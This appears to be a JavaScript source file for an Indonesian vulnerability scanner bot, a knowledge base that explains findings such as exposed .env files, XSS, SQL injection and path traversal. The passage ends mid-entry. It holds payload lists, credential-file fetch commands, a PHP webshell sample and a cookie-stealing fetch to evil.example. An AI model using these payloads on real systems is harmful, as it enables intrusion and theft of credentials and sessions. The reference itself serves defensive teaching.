'use strict';

/**
 * vulnKB - Basis Pengetahuan Kerentanan (Vulnerability Knowledge Base).
 *
 * Tujuan:
 *  - Setiap temuan scanner dipetakan ke penjelasan lengkap: Vuln ID internal
 *    (CXL-xxx), CWE ID, nama bug, kategori/OWASP, severity, penjelasan bug,
 *    dampak, CONTOH PAYLOAD, CONTOH BUG DETAIL (kode rentan + request serangan
 *    + respons rentan), cara perbaikan, dan referensi.
 *  - Dipakai untuk live progress saat scan ("bug apa yang baru ditemukan?") dan
 *    halaman Detail Bug di bot (/vuln <query> atau tombol "Detail Bug").
 *
 * API:
 *  - kbFor(externalId, evidence) -> entry | null   (resolusi otomatis dari ID temuan)
 *  - kbEntry(key)                                 (ambil entry langsung)
 *  - kbSearch(q)                                  (pencarian sederhana utk /vuln)
 *  - kbList()                                     (semua key)
 *  - ENRICH(externalId, evidence) -> {vuln_id, cwe, payload_example, bug_example} (untuk evidence JSON)
 */

const SEP = '─'.repeat(34);

function entry(o) {
  return Object.freeze(o);
}

// ---------------------------------------------------------------------------
// Registry utama
// ---------------------------------------------------------------------------
const KB = {
  // ===================== CRITICAL =====================
  'env-exposed': entry({
    vulnId: 'CXL-001',
    cwe: 'CWE-200',
    name: 'File .env / Konfigurasi Rahasia Terekspos',
    severity: 'critical',
    category: 'Sensitive Data Exposure',
    owasp: 'A02:2021',
    what: 'File konfigurasi aplikasi (biasanya .env) bisa diakses langsung dari internet. File ini berisi kredensial database, API key, APP_KEY, password SMTP, dan secret lainnya.',
    impact: 'Penyerang mendapat kredensial database/layanan cloud tanpa perlu eksploitasi lain. Bisa berujung pada kebocoran total data, pengambilalihan server, dan penagihan cloud yang membengkak.',
    payloads: ['GET /.env', 'GET /.env.local', 'GET /.env.backup', 'GET /config.php.bak', 'GET /wp-config.php.bak'],
    vulnerable: `# .env - TIDAK boleh bisa diakses via web
APP_KEY=base64:R4nd0mS3cr3tK3y=
DB_PASSWORD=SuperSecret123
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCY`,
    attack: 'GET /.env HTTP/1.1\nHost: target.com\nUser-Agent: Mozilla/5.0',
    response: 'HTTP/1.1 200 OK\nContent-Type: text/plain\n\nAPP_KEY=base64:R4nd0mS3cr3tK3y=\nDB_PASSWORD=SuperSecret123\nAWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE',
    fix: 'Blokir akses publik ke file dotfile (deny /.env* di web server), pindahkan file env keluar dari web root, putar/rotasi SEMUA kredensial yang pernah terekspos, dan audit log akses.',
    reference: 'https://owasp.org/Top10/A02_2021-Cryptographic_Failures/',
  }),

  'aws-creds-exposed': entry({
    vulnId: 'CXL-002',
    cwe: 'CWE-798',
    name: 'Kredensial Cloud (AWS) Terekspos',
    severity: 'critical',
    category: 'Hard-coded Credentials',
    owasp: 'A02:2021',
    what: 'File kredensial AWS (mis. /.aws/credentials) dapat diunduh publik. Berisi Access Key ID dan Secret Access Key yang memberi akses penuh ke akun cloud sesuai IAM policy-nya.',
    impact: 'Penyerang bisa membaca S3, menghapus infrastruktur, memakai EC2 untuk crypto-mining, atau eskalasi ke akun lain. Ini termasuk temuan paling berat dalam program bug bounty.',
    payloads: ['GET /.aws/credentials', 'GET /aws-secret.yml', 'grep AKIA pada file JS publik'],
    vulnerable: `[default]
aws_access_key_id = AKIAIOSFODNN7EXAMPLE
aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY`,
    attack: 'curl -s https://target.com/.aws/credentials',
    response: '[default]\naws_access_key_id = AKIAIOSFODNN7EXAMPLE\naws_secret_access_key = wJalrXUtnFEMI/K7MDENG/',
    fix: 'Revoke/deaktifkan key segera lewat IAM, gunakan IAM Role alih-alih key statis, blokir direktori .aws di web server, dan aktifkan CloudTrail untuk memeriksa penyalahgunaan.',
    reference: 'https://cwe.mitre.org/data/definitions/798.html',
  }),

  'db-dump-exposed': entry({
    vulnId: 'CXL-003',
    cwe: 'CWE-200',
    name: 'Dump Database Terekspos',
    severity: 'critical',
    category: 'Sensitive Data Exposure',
    owasp: 'A02:2021',
    what: 'File dump database (db.sql, database.sql, dump.sql) tersedia di web root. Biasanya berisi seluruh tabel, termasuk hash password, data user, dan token sesi.',
    impact: 'Seluruh isi database bisa diunduh: akun user, hash password (bisa di-crack offline), PII, dan data transaksi. Pelanggaran privasi yang serius.',
    payloads: ['GET /db.sql', 'GET /database.sql', 'GET /dump.sql', 'GET /backup/db.sql'],
    vulnerable: '-- MySQL dump 10.13\nCREATE TABLE users (\n  id INT PRIMARY KEY,\n  email VARCHAR(255),\n  password_hash VARCHAR(255)\n);\nINSERT INTO users VALUES (1,\'admin@target.com\',\'$2y$10$...\');',
    attack: 'curl -O https://target.com/db.sql',
    response: 'HTTP/1.1 200 OK\nContent-Type: application/sql\n\n-- MySQL dump 10.13 ... (file terunduh penuh)',
    fix: 'Hapus file dump dari web root, tambahkan rule deny untuk *.sql, simpan backup di storage privat (bukan web root), dan rotasi semua kredensial yang ada di dump.',
    reference: 'https://owasp.org/Top10/A02_2021-Cryptographic_Failures/',
  }),

  'backup-exposed': entry({
    vulnId: 'CXL-004',
    cwe: 'CWE-530',
    name: 'File Backup Aplikasi Terekspos',
    severity: 'critical',
    category: 'Exposure of Backup File',
    owasp: 'A02:2021',
    what: 'Arsip backup situs (backup.zip, backup.tar.gz) atau backup file konfigurasi (config.php.bak) bisa diakses publik dan berisi source code + kredensial.',
    impact: 'Source code lengkap membantu penyerang menemukan logika bisnis, endpoint tersembunyi, dan kredensial hard-coded, lalu merencanakan serangan lanjutan yang jauh lebih presisi.',
    payloads: ['GET /backup.zip', 'GET /backup.tar.gz', 'GET /site.bak', 'GET /www.tar.gz'],
    vulnerable: 'web root/\n  index.php\n  backup.zip   <-- berisi seluruh source + .env',
    attack: 'curl -O https://target.com/backup.zip && unzip backup.zip',
    response: 'HTTP/1.1 200 OK\nContent-Type: application/zip\nContent-Length: 48213321\nPK\\x03\\x04 ...',
    fix: 'Hapus backup dari server produksi, simpan di storage terpisah yang privat, blokir ekstensi arsip di web server, dan rotasi semua secret di dalamnya.',
    reference: 'https://cwe.mitre.org/data/definitions/530.html',
  }),

  'secret-leak': entry({
    vulnId: 'CXL-005',
    cwe: 'CWE-798',
    name: 'API Key / Secret Terekspos (Hard-coded)',
    severity: 'critical',
    category: 'Exposed Credentials',
    owasp: 'A02:2021',
    what: 'API key, token, atau secret ditemukan dalam respons HTTP (file JS, halaman HTML, header). Pola yang terdeteksi mencakup AWS, Google, Stripe, Twilio, JWT, Slack, dll.',
    impact: 'Secret yang bocor dipakai langsung ke layanan penyedianya: pengiriman SMS/email atas nama Anda, akses bucket, penarikan data, atau pembayaran. Sangat sering menjadi jalan masuk insiden nyata.',
    payloads: ['curl https://target.com/static/app.js | grep -E "AKIA|api_key|secret"', 'GET /static/js/main.js'],
    vulnerable: `// public/static/config.js  <- SERVED TO BROWSER
window.STRIPE_KEY = 'sk_live_51H8xYzAbCdEfGh123';
window.MAP_TOKEN  = 'AIzaSyB9-EXAMPLE_KEY_1234567890';`,
    attack: 'GET /static/config.js HTTP/1.1\nHost: target.com',
    response: "HTTP/1.1 200 OK\nContent-Type: application/javascript\n\nwindow.STRIPE_KEY = 'sk_live_51H8xYzAbCdEfGh123';",
    fix: 'Revoke key dari dashboard penyedia, pindahkan secret ke server-side/env var, gunakan token ber-scope terbatas + referer/IP restriction untuk key yang wajib ada di client, dan tambahkan pre-commit secret scanning.',
    reference: 'https://owasp.org/www-project-top-ten/2021/A02_2021-Cryptographic_Failures',
  }),

  'subdomain-takeover': entry({
    vulnId: 'CXL-006',
    cwe: 'CWE-350',
    name: 'Potensi Subdomain Takeover',
    severity: 'critical',
    category: 'Broken Access Control / DNS',
    owasp: 'A05:2021',
    what: 'Subdomain menunjuk (CNAME) ke layanan eksternal yang sudah tidak aktif (mis. bucket S3 dihapus, app Heroku dihapus), dan layanan tersebut menampilkan pesan "tidak ditemukan". Penyerang bisa mengklaim resource tersebut dan menguasai subdomain Anda.',
    impact: 'Penyerang dapat meng-host konten apa pun di subdomain Anda: phishing dengan domain sah (cookie domain utama bisa terbaca), bypass CSP, dan pencurian sesi via subdomain.',
    payloads: ['dig sub.target.com CNAME', 'curl -s https://sub.target.com/ | grep -i "NoSuchBucket"'],
    vulnerable: 'sub.target.com. 300 IN CNAME target-website.s3.amazonaws.com.\n# bucket sudah dihapus, DNS masih menunjuk ke sana',
    attack: '1. Buat bucket bernama "target-website" di AWS S3 (region sama)\n2. curl -s https://sub.target.com/ -> konten milik penyerang',
    response: 'HTTP/1.1 404 Not Found\n\n<?xml version="1.0"?><Error><Code>NoSuchBucket</Code><Message>The specified bucket does not exist</Message></Error>',
    fix: 'Hapus/ubah DNS record yang menunjuk ke layanan mati, klaim ulang resource di layanan penyedia, dan aktifkan monitoring DNS untuk CNAME menggantung (dangling record).',
    reference: 'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/10-Test_for_Subdomain_Takeover',
  }),

  'malware-detected': entry({
    vulnId: 'CXL-007',
    cwe: 'CWE-506',
    name: 'Indikasi Malware / Webshell / Defacement',
    severity: 'critical',
    category: 'Embedded Malicious Code',
    owasp: 'A06:2021',
    what: 'Halaman berisi pola yang biasanya menandai kompromi: webshell (wso/c99/b374k), crypto miner inline, iframe tersembunyi, konten spam obat/judi, atau halaman fake-update.',
    impact: 'Server kemungkinan besar sudah dikompromi. Pengunjung terpapar drive-by download, mining, phishing, dan reputasi domain masuk blacklist.',
    payloads: ['curl -s https://target.com/ | grep -Ei "eval\\(base64_decode|wso|coinhive|xmrig"', 'GET /wp-content/uploads/2024/10/shell.php'],
    vulnerable: `<?php /* webshell klasik */
$password = "e10adc3949ba59abbe56e057f20f883e";
eval(base64_decode($_POST['cmd']));`,
    attack: 'POST /shell.php  cmd=echo%20shell_exec(%27ls%20-la%27);',
    response: 'HTTP/1.1 200 OK\n\ndrwxr-xr-x www-data www-data ... (daftar file server)',
    fix: 'Isolasi server, ganti semua kredensial, scan dengan malware scanner + integrity check (git status, diff deploy), patch CMS/plugin lama, dan restore dari backup bersih yang terverifikasi.',
    reference: 'https://cwe.mitre.org/data/definitions/506.html',
  }),

  // ===================== HIGH =====================
  'git-exposed': entry({
    vulnId: 'CXL-010',
    cwe: 'CWE-538',
    name: 'Repository .git Terekspos',
    severity: 'high',
    category: 'File and Directory Information Exposure',
    owasp: 'A02:2021',
    what: 'Direktori .git dapat diakses publik. Seluruh riwayat source code, commit, dan file yang "dihapus" bisa diunduh ulang lewat objek git.',
    impact: 'Penyerang memakai tools seperti git-dumper untuk memulihkan seluruh source code, termasuk secret lama yang pernah ter-commit (password, API key).',
    payloads: ['GET /.git/HEAD', 'GET /.git/config', 'git-dumper https://target.com/.git/ ./repo'],
    vulnerable: '# Apache melayani web root tanpa blokir dotfile\nDocumentRoot /var/www/html   # /var/www/html/.git/ ikut terpublish',
    attack: 'GET /.git/HEAD HTTP/1.1\nHost: target.com',
    response: 'HTTP/1.1 200 OK\n\nref: refs/heads/main',
    fix: 'Blokir /.git di web server (deny .git), hapus .git dari deployment (pakai build artifact, bukan rsync repo), dan rotasi semua secret yang ada di riwayat commit.',
    reference: 'https://cwe.mitre.org/data/definitions/538.html',
  }),

  'svn-exposed': entry({
    vulnId: 'CXL-011',
    cwe: 'CWE-538',
    name: 'Metadata SVN Terekspos',
    severity: 'high',
    category: 'File and Directory Information Exposure',
    owasp: 'A02:2021',
    what: 'Direktori .svn terekspos memungkinkan pemulihan struktur dan isi source code (entri pristine).',
    impact: 'Source code dan struktur internal aplikasi terungkap, mempermudah pencarian bug lanjutan.',
    payloads: ['GET /.svn/entries', 'GET /.svn/wc.db'],
    vulnerable: 'web root/.svn/entries  (format: "12\\ndir")',
    attack: 'GET /.svn/entries HTTP/1.1',
    response: 'HTTP/1.1 200 OK\n\n12\ndir\n1\\n...',
    fix: 'Blokir /.svn di web server dan pastikan proses deploy tidak menyalin folder metadata VCS ke produksi.',
    reference: 'https://cwe.mitre.org/data/definitions/538.html',
  }),

  'phpinfo-exposed': entry({
    vulnId: 'CXL-012',
    cwe: 'CWE-200',
    name: 'phpinfo() Terekspos',
    severity: 'high',
    category: 'Information Disclosure',
    owasp: 'A02:2021',
    what: 'Halaman phpinfo() terekspos memperlihatkan versi PHP, extension, path absolut, environment variable (kadang berisi API key), dan konfigurasi server.',
    impact: 'Memberi penyerang peta lengkap target: versi rentan, path upload, dan terkadang secret di environment variables.',
    payloads: ['GET /phpinfo.php', 'GET /info.php', 'GET /test.php'],
    vulnerable: '<?php phpinfo(); ?>',
    attack: 'GET /phpinfo.php HTTP/1.1',
    response: 'HTTP/1.1 200 OK\n\nPHP Version 7.4.3 ... DOCUMENT_ROOT=/var/www/html ... REDIS_PASSWORD=xxx',
    fix: 'Hapus file phpinfo dari produksi, blokir akses, dan sembunyikan detail versi (expose_php=Off).',
    reference: 'https://www.php.net/manual/en/function.phpinfo.php',
  }),

  'actuator-exposed': entry({
    vulnId: 'CXL-013',
    cwe: 'CWE-200',
    name: 'Spring Boot Actuator Terekspos',
    severity: 'high',
    category: 'Security Misconfiguration',
    owasp: 'A05:2021',
    what: 'Endpoint Actuator (/actuator/env, /actuator/heapdump) terbuka untuk publik. env memperlihatkan konfigurasi (dan sering password ter-mask buruk); heapdump berisi memory snapshot yang bisa berisi kredensial.',
    impact: 'Kredensial database/token bisa diekstrak dari env atau heapdump, dan fitur shutdown/restart bisa dipakai untuk DoS bila diaktifkan.',
    payloads: ['GET /actuator/env', 'GET /actuator/heapdump', 'GET /actuator/mappings'],
    vulnerable: 'management.endpoints.web.exposure.include=*\n# tanpa spring-boot-starter-security',
    attack: 'curl -O https://target.com/actuator/heapdump\nstrings heapdump | grep -i password',
    response: 'HTTP/1.1 200 OK\nContent-Type: application/vnd.spring-boot.actuator.v3+json\n\n{"propertySources":[{"name":"...","properties":{"spring.datasource.password":{"value":"S3cr3t"}}}]}',
    fix: 'Batasi endpoint yang terekspos (health,info saja), lindungi dengan Spring Security + network rule internal, dan matikan heapdump di produksi.',
    reference: 'https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html',
  }),

  'xss-reflected': entry({
    vulnId: 'CXL-021',
    cwe: 'CWE-79',
    name: 'Reflected XSS (Cross-site Scripting)',
    severity: 'high',
    category: 'Injection',
    owasp: 'A03:2021',
    what: 'Nilai parameter direfleksikan kembali ke halaman TANPA encoding, sehingga markup/JavaScript yang disisipkan di URL akan dieksekusi browser korban.',
    impact: 'Pencurian cookie/sesi (bila HttpOnly lemah), defacement konten, keylogging, redirect phishing, dan eksekusi aksi atas nama korban (CSRF-killer).',
    payloads: [
      'cxlp0i"><svg/onload=cxlp0i>',
      '<script>alert(1)</script>',
      '"><img src=x onerror=alert(1)>',
      "'-alert(1)-'",
    ],
    vulnerable: `// PHP - nilai GET dicetak mentah
<div class="result">
  Hasil pencarian: <?php echo $_GET['q']; ?>
</div>`,
    attack: 'GET /search?q=cxlp0i"><svg/onload=cxlp0i> HTTP/1.1\nHost: target.com',
    response: 'HTTP/1.1 200 OK\nContent-Type: text/html\n\n<div class="result">\n  Hasil pencarian: cxlp0i"><svg/onload=cxlp0i>\n</div>',
    fix: 'Encode output sesuai konteks (HTML entity, attribute, JS, URL), pakai template engine auto-escape, tambahkan CSP yang membatasi inline script, dan validasi input dengan allowlist.',
    reference: 'https://owasp.org/www-community/attacks/xss/',
  }),

  'sql-injection': entry({
    vulnId: 'CXL-022',
    cwe: 'CWE-89',
    name: 'SQL Injection (Error-Based)',
    severity: 'high',
    category: 'Injection',
    owasp: 'A03:2021',
    what: 'Error message database muncul di respons ketika karakter kutip dikirim ke parameter. Ini menandakan input dimasukkan langsung ke query SQL tanpa parameterisasi.',
    impact: 'Bypass login, pembacaan seluruh database, dan pada konfigurasi tertentu eksekusi perintah OS. Data user/PII bisa tumpah total.',
    payloads: [
      "'",
      "' OR '1'='1",
      "' UNION SELECT NULL,version()-- -",
      "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    ],
    vulnerable: `// PHP - query dirangkai string (rentan)
$id = $_GET['id'];
$sql = "SELECT * FROM products WHERE id = '" . $id . "'";
mysqli_query($conn, $sql);`,
    attack: "GET /product?id=1' HTTP/1.1\nHost: target.com",
    response: 'HTTP/1.1 200 OK\n\nWarning: mysqli_query(): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near \'\'\' at line 1',
    fix: 'Gunakan parameterized query / prepared statement untuk SEMUA query, validasi tipe data, matikan detailed error di produksi, dan beri hak minimal user DB aplikasi.',
    reference: 'https://owasp.org/www-community/attacks/SQL_Injection',
  }),

  'path-traversal': entry({
    vulnId: 'CXL-023',
    cwe: 'CWE-22',
    name: 'Path Traversal / LFI',
    severity: 'high',
    category: 'Broken Access Control',
    owasp: 'A01:2021',
    what: 'Aplikasi memakai input user untuk membangun path file, dan sequence ../ lolos dari direktori yang diizinkan sehingga file arbitrer di server bisa dibaca.',
    impact: 'Pembacaan file sensitif: /etc/passwd, kredensial aplikasi, private key, source code. Bisa digabung dengan upload untuk RCE (log poisoning, session file).',
    payloads: [
      '../../../../etc/passwd',
      '....//....//....//etc/passwd',
      '..%2f..%2f..%2fetc%2fpasswd',
      '%2e%2e%2f%2e%2e%2fetc/passwd',
    ],
    vulnerable: `// PHP - path dirangkai input user
$file = $_GET['page'];
include('/var/www/pages/' . $file . '.php');`,
    attack: 'GET /download?page=../../../../etc/passwd HTTP/1.1\nHost: target.com',
    response: 'HTTP/1.1 200 OK\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n...',
    fix: 'Terima identifier (ID) lalu petakan ke path lewat allowlist, panggil realpath() dan pastikan hasilnya di dalam base dir, tolak ../ dan null byte, dan jalankan proses dengan hak minimal.',
    reference: 'https://owasp.org/www-community/attacks/Path_Traversal',
  }),

  'tls-expired': entry({
    vulnId: 'CXL-024',
    cwe: 'CWE-298',
    name: 'Sertifikat TLS Kedaluwarsa',
    severity: 'high',
    category: 'Cryptographic Failure',
    owasp: 'A02:2021',
    what: 'Sertifikat HTTPS situs sudah melewati tanggal kedaluwarsa sehingga browser menampilkan peringatan penuh.',
    impact: 'Pengguna diajak memilih "lanjutkan" terhadap peringatan - membiasakan perilaku berbahaya; MITM lebih mudah dinormalisasi; traffic bisa turun drastis.',
    payloads: ['openssl s_client -connect target.com:443 | openssl x509 -noout -dates'],
    vulnerable: 'notAfter=Jan 1 00:00:00 2025 GMT   (sudah lewat)',
    attack: 'openssl s_client -connect target.com:443 -servername target.com',
    response: "Certificate chain 0 s:CN = target.com\nnotBefore=Jan 1 2024\nnotAfter=Jan 1 2025 (EXPIRED)",
    fix: 'Perpanjang sertifikat (renew ACME/Let\u2019s Encrypt otomatis), aktifkan monitoring kedaluwarsa, dan pastikan SNI + chain lengkap terpasang.',
    reference: 'https://cwe.mitre.org/data/definitions/298.html',
  }),

  'cors-reflected': entry({
    vulnId: 'CXL-025',
    cwe: 'CWE-942',
    name: 'CORS Origin Terefleksi (Permissive)',
    severity: 'high',
    category: 'Security Misconfiguration',
    owasp: 'A05:2021',
    what: 'Server memantulkan header Origin apa pun ke Access-Control-Allow-Origin, sering kali bersama Access-Control-Allow-Credentials: true.',
    impact: 'Situs eksternal apa pun boleh membaca respons API dengan kredensial cookie korban -> pencurian data pribadi/token secara diam-diam dari browser korban.',
    payloads: [
      'curl -H "Origin: https://evil.example" -I https://target.com/api/me',
      'Origin: null',
    ],
    vulnerable: '// Express - CORS permisif\napp.use(cors({ origin: true, credentials: true }));\n// origin:true memantulkan Origin apa pun',
    attack: 'GET /api/me HTTP/1.1\nHost: target.com\nOrigin: https://evil.example\nCookie: session=...',
    response: 'HTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://evil.example\nAccess-Control-Allow-Credentials: true\nContent-Type: application/json\n\n{"email":"victim@x.com","token":"..."}',
    fix: 'Allowlist origin eksplisit, jangan pantulkan Origin mentah, jangan gabungkan wildcard dengan credentials, dan verifikasi trust sebelum mengirim header CORS.',
    reference: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS',
  }),

  // ===================== MEDIUM =====================
  'xss-encoded': entry({
    vulnId: 'CXL-026',
    cwe: 'CWE-79',
    name: 'XSS Terefleksi dengan Encoding Sebagian',
    severity: 'medium',
    category: 'Injection',
    owasp: 'A03:2021',
    what: 'Nilai parameter terefleksi dan sebagian karakter di-encode, tetapi konteks tertentu (attribute/JS) masih memungkinkan keluar dari konteks dengan mutasi/payload khusus.',
    impact: 'Eksekusi script terbatas namun sering tetap mungkin via konteks attribute atau JS string, terutama tanpa CSP.',
    payloads: [
      '"><svg/onload=cxlp0i>',
      '" onmouseover="alert(1)',
      '\\u003csvg onload=alert(1)\\u003e',
    ],
    vulnerable: '<input value="HASIL_ENCODE_SEBAGIAN" data-x="...">',
    attack: 'GET /search?q=" onmouseover="alert(1) HTTP/1.1',
    response: 'HTTP/1.1 200 OK\n\n<input value="" onmouseover="alert(1)" data-x="...">',
    fix: 'Encode sesuai konteks keluaran (HTML/attr/JS/URL), hindari memasukkan data user ke event handler attribute, dan terapkan CSP nonce.',
    reference: 'https://owasp.org/www-project-cheat-sheets/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet',
  }),

  'open-redirect': entry({
    vulnId: 'CXL-027',
    cwe: 'CWE-601',
    name: 'Open Redirect',
    severity: 'medium',
    category: 'Broken Access Control',
    owasp: 'A01:2021',
    what: 'Parameter redirect menerima URL/kanari eksternal dan server melakukan redirect ke sana, tanpa validasi tujuan.',
    impact: 'Phishing yang tampak sah karena domain asli di bar URL; pencurian token OAuth via redirect_uri; reputasi domain terpakai untuk kampaign jahat.',
    payloads: [
      '?next=https://evil.example',
      '?url=//evil.example',
      '?redirect=https%3A%2F%2Fevil.example',
      '?to=javascript:alert(1)',
    ],
    vulnerable: `// Node/Express
app.get('/login', (req, res) => {
  res.redirect(req.query.next); // tidak divalidasi!
});`,
    attack: 'GET /login?next=https://evil.example HTTP/1.1\nHost: target.com',
    response: 'HTTP/1.1 302 Found\nLocation: https://evil.example',
    fix: 'Validasi tujuan dengan allowlist path/host internal, gunakan relative redirect (tanpa scheme), dan tolak URL absolut/protocol-relative untuk alur sensitif.',
    reference: 'https://cwe.mitre.org/data/definitions/601.html',
  }),

  'redirect-downgrade': entry({
    vulnId: 'CXL-028',
    cwe: 'CWE-319',
    name: 'Redirect HTTPS ke HTTP (Downgrade)',
    severity: 'medium',
    category: 'Cryptographic Failure',
    owasp: 'A02:2021',
    what: 'Situs mengalihkan pengguna dari HTTPS ke URL HTTP (cleartext), membuka window MITM pada hop pertama.',
    impact: 'Payload injection di jaringan publik (wifi) sebelum user kembali ke HTTPS; token di URL bisa terbaca.',
    payloads: ['curl -I https://target.com/link'],
    vulnerable: 'HTTP/1.1 302 Found\nLocation: http://target.com/beranda',
    attack: 'curl -sI https://target.com/ | grep -i location',
    response: 'Location: http://target.com/beranda   <-- downgrade',
    fix: 'Selalu redirect ke https:// dengan HSTS aktif; jangan pernah menautkan internal link ke http://.',
    reference: 'https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html',
  }),

  'cors-wildcard-creds': entry({
    vulnId: 'CXL-029',
    cwe: 'CWE-942',
    name: 'CORS Wildcard (*) Dengan Kredensial',
    severity: 'medium',
    category: 'Security Misconfiguration',
    owasp: 'A05:2021',
    what: 'Respons memakai Access-Control-Allow-Origin: * pada endpoint sensitif, atau mengizinkan header kredensial/otorisasi tanpa perlu (wildcard auth headers).',
    impact: 'Mendorong klien menyeret kredensial ke mana-mana dan memperlebar permukaan pencurian header sensitif dari origin pihak ketiga.',
    payloads: ['curl -sI -H "Origin: https://evil.example" https://target.com/api/'],
    vulnerable: 'Access-Control-Allow-Origin: *\nAccess-Control-Allow-Headers: Authorization, Cookie',
    attack: 'OPTIONS /api/ HTTP/1.1\nOrigin: https://evil.example\nAccess-Control-Request-Headers: authorization',
    response: 'HTTP/1.1 204 No Content\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Headers: Authorization, Cookie',
    fix: 'Set CORS eksplisit per-origin, hapus wildcard pada endpoint privat, dan jangan mendaftarkan header kredensial kecilian.',
    reference: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS',
  }),

  'dirlisting': entry({
    vulnId: 'CXL-030',
    cwe: 'CWE-548',
    name: 'Directory Listing',
    severity: 'medium',
    category: 'Security Misconfiguration',
    owasp: 'A05:2021',
    what: 'Server menampilkan daftar isi direktori, memperlihatkan file backup, skrip internal, dan struktur aplikasi.',
    impact: 'File yang tidak dimaksudkan publik (old/, .bak, export.csv) mudah ditemukan dan diunduh.',
    payloads: ['GET /uploads/', 'GET /static/', 'GET /backup/'],
    vulnerable: '# Apache - Indexes aktif\n<Directory /var/www/html/uploads>\n  Options +Indexes\n</Directory>',
    attack: 'GET /uploads/ HTTP/1.1',
    response: 'HTTP/1.1 200 OK\nContent-Type: text/html\n\n<h1>Index of /uploads/</h1><a href="dump-2024.csv">dump-2024.csv</a> ...',
    fix: 'Matikan autoindex (Options -Indexes), sediakan index.html di setiap direktori, dan audit file yang berada di web root.',
    reference: 'https://cwe.mitre.org/data/definitions/548.html',
  }),

  'stack-trace': entry({
    vulnId: 'CXL-031',
    cwe: 'CWE-209',
    name: 'Stack Trace / Debug Info Terekspos',
    severity: 'medium',
    category: 'Information Disclosure',
    owasp: 'A05:2021',
    what: 'Halaman error memunculkan stack trace, path file absolut, versi framework, dan kadang potongan query atau nilai variabel.',
    impact: 'Memberi penyerang detail internal: path, library + versi (cari CVE), dan potongan kode yang memandu eksploitasi lanjutan.',
    payloads: ["?q='", '?id=abc', '?page[]=x   (tipifikasi error)'],
    vulnerable: 'app.set("showStackError", true);\n// atau debug=true di framework lama',
    attack: "GET /product?id=' HTTP/1.1",
    response: 'HTTP/1.1 500 Internal Server Error\n\nTraceback (most recent call last):\n  File "/srv/app/views.py", line 42, in get_product\n    cursor.execute("SELECT ... %s" % id)',
    fix: 'Tampilkan halaman error generik, catat stack trace ke log internal saja (Sentry dsb), dan set debug=false di produksi.',
    reference: 'https://cwe.mitre.org/data/definitions/209.html',
  }),

  'cookie-flags': entry({
    vulnId: 'CXL-032',
    cwe: 'CWE-614',
    name: 'Cookie Tanpa Atribut Keamanan',
    severity: 'medium',
    category: 'Session Management',
    owasp: 'A07:2021',
    what: 'Cookie sesi tidak memakai Secure, HttpOnly, atau SameSite sehingga lebih mudah dicuri via XSS, dikirim via HTTP, atau diserang CSRF.',
    impact: 'Pembajakan sesi: script pihak ketiga/XSS bisa membaca cookie (tanpa HttpOnly), CSRF lebih mudah (tanpa SameSite), sniffing di jaringan (tanpa Secure).',
    payloads: ['curl -sI https://target.com/login | grep -i set-cookie'],
    vulnerable: 'Set-Cookie: PHPSESSID=abc123; Path=/\n# tanpa Secure, HttpOnly, SameSite',
    attack: '(XSS) <script>fetch("https://evil.example?c="+document.cookie)</script>',
    response: 'Set-Cookie: PHPSESSID=abc123; Path=/',
    fix: 'Set-Cookie: HttpOnly; Secure; SameSite=Lax (atau Strict untuk sesi sensitif); rotasi session id setelah login.',
    reference: 'https://owasp.org/www-project-cheat-sheets/cheatsheets/Session_Management_Cheat_Sheet',
  }),

  'mixed-content': entry({
    vulnId: 'CXL-033',
    cwe: 'CWE-311',
    name: 'Mixed Content (HTTP di Halaman HTTPS)',
    severity: 'medium',
    category: 'Cryptographic Failure',
    owasp: 'A02:2021',
    what: 'Halaman HTTPS memuat resource lewat http:// (script, iframe, gambar). Script/iframe HTTP bisa diubah penyadap jaringan.',
    impact: 'Script mixed content aktif diblokir modern browser, namun bila lolos (pasif/upgraded) membuka pintu MITM dan peringatan browser.',
    payloads: ['curl -s https://target.com/ | grep -Eo \'src="http://[^\"]+"\''],
    vulnerable: '<script src="http://cdn.example.com/jquery.min.js"></script>',
    attack: '(MITM wifi publik) tanggapi request cdn dan sisipkan script sendiri',
    response: 'HTTP/1.1 200 OK (http://) ... <script>alert("pwned")</script>',
    fix: 'Gunakan https:// atau protocol-relative untuk semua resource, tambahkan CSP upgrade-insecure-requests, dan fix CDN legacy.',
    reference: 'https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content',
  }),

  'http-methods': entry({
    vulnId: 'CXL-034',
    cwe: 'CWE-650',
    name: 'HTTP Methods Berbahaya Aktif',
    severity: 'medium',
    category: 'Security Misconfiguration',
    owasp: 'A05:2021',
    what: 'Server mengizinkan method seperti TRACE/PUT/DELETE pada resource publik. TRACE memungkinkan Cross-Site Tracing; PUT/DELETE bila benar aktif memungkinkan manipulasi file/resource.',
    impact: 'TRACE bisa membocorkan header (cookie) di browser lama; PUT aktif = upload file = RCE langsung.',
    payloads: ['OPTIONS / HTTP/1.1', 'TRACE / HTTP/1.1'],
    vulnerable: '# Apache AllowOverride lama: TRACE Enable\n<Directory /> AllowMethods TRACE PUT DELETE </Directory>',
    attack: 'OPTIONS * HTTP/1.1\nHost: target.com',
    response: 'HTTP/1.1 200 OK\nAllow: GET, POST, OPTIONS, TRACE, PUT, DELETE',
    fix: 'Matikan method tak terpakai (TraceEnable Off, limit_except), hanya izinkan GET/POST/OPTIONS yang benar-benar diperlukan.',
    reference: 'https://owasp.org/www-community/attacks/Cross_Site_Tracing',
  }),

  'cors-wildcard-auth': entry({
    vulnId: 'CXL-035',
    cwe: 'CWE-942',
